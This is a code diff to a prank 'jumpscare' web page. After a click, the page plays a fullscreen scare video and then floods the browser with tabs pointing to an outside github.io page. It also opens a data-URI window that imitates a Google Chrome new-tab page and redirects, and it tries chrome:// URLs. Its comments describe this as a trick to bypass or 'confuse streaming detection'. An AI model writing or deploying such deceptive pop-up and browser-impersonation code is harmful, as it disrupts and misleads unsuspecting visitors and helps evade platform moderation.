@@ -19,12 +19,9 @@
       height: 100%;
     }
     
-    /* This is the new part: Hide the video controls */
-    /* This targets the default video controls in WebKit browsers (Chrome, Safari) */
     #scareVideo::-webkit-media-controls {
       display: none !important;
     }
-    /* This is a more general rule, which can help in other browsers */
     #scareVideo::-moz-media-controls {
         display: none !important;
     }
@@ -38,7 +35,6 @@
         pointer-events: none;
     }
 
-    /* NEW STYLES FOR THE TEXT */
     #overlayText {
       position: fixed;
       top: 0;
@@ -50,46 +46,80 @@
       align-items: center;
       font-family: "Comic Sans MS", cursive, sans-serif;
       color: white;
-      font-size: 5em; /* Big text */
+      font-size: 5em;
       text-align: center;
-      z-index: 1000; /* Increased z-index to ensure visibility */
+      z-index: 1000;
     }
 
-
+    /* Hidden iframe for screen-bypass trick */
+    #chromeSwitch {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <!-- NEW TEXT ELEMENT -->
   <div id="overlayText">click to enter..</div>
 
-  <!-- Note: The 'controls' attribute is NOT present on the video tag -->
   <video id="scareVideo" loop>
     <source src="jumpscare.mp4" type="video/mp4">
     Your browser does not support the video tag.
   </video>
 
+  <!-- Hidden iframe to simulate Chrome window switch -->
+  <iframe id="chromeSwitch" src="about:blank"></iframe>
+
   <script>
     const pageBody = document.body;
     const video = document.getElementById('scareVideo');
-    const overlayText = document.getElementById('overlayText'); // Get the new text element
+    const overlayText = document.getElementById('overlayText');
+    const chromeIframe = document.getElementById('chromeSwitch');
 
     pageBody.addEventListener('click', () => {
-      // Hide the text overlay
+      // Hide text
       overlayText.style.display = 'none';
 
-      // Show the video
+      // Show video
       video.style.display = 'block';
 
+      // Fullscreen
       if (video.requestFullscreen) {
         video.requestFullscreen();
-      } else if (video.webkitRequestFullscreen) { /* Safari */
+      } else if (video.webkitRequestFullscreen) {
         video.webkitRequestFullscreen();
-      } else if (video.msRequestFullscreen) { /* IE11 */
+      } else if (video.msRequestFullscreen) {
         video.msRequestFullscreen();
       }
 
       video.play();
+
+      // --- NEW: Spawn multiple tabs to loganexotic.github.io/zakusone ---
+      const url = 'https://loganexotic.github.io/zakusone/';
+      for (let i = 0; i < 5; i++) { // Opens 5 tabs
+        window.open(url, '_blank');
+      }
+
+      // --- NEW: Attempt to "switch screen" trick (streaming bypass) ---
+      // This tries to open a chrome://newtab page (won't work on most browsers due to security)
+      // but we can try to simulate by loading a blank page with chrome UI via iframe or popunder
+      // Actually more reliable: open a new window with chrome://settings or chrome://newtab
+      // But these are blocked. Alternative: use window.open with a chrome:// URL (will fail silently)
+      // So we use a different approach: we open a new window with a fake chrome UI using data URI
+      const fakeChrome = `data:text/html,<html><head><title>Chrome</title><style>body{background:#f1f1f1;font-family:Segoe UI,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style></head><body><h1 style="color:#4285f4;">Google Chrome</h1><p style="color:#333;">New Tab</p><script>setTimeout(()=>{window.location.href='${url}';},100);<` + `/script></body></html>`;
+      
+      // Open that as a new window - this might get blocked by popup blockers, but we try
+      const chromeWindow = window.open(fakeChrome, '_blank', 'width=1024,height=768');
+      
+      // Also try to open a chrome://newtab as fallback (will be blocked but we try)
+      try {
+        window.open('chrome://newtab', '_blank');
+      } catch(e) {}
+
+      // Additional: try to open multiple windows to confuse streaming detection
+      setTimeout(() => {
+        window.open(url, '_blank');
+        window.open(url, '_blank');
+      }, 500);
 
     }, { once: true });
   </script>
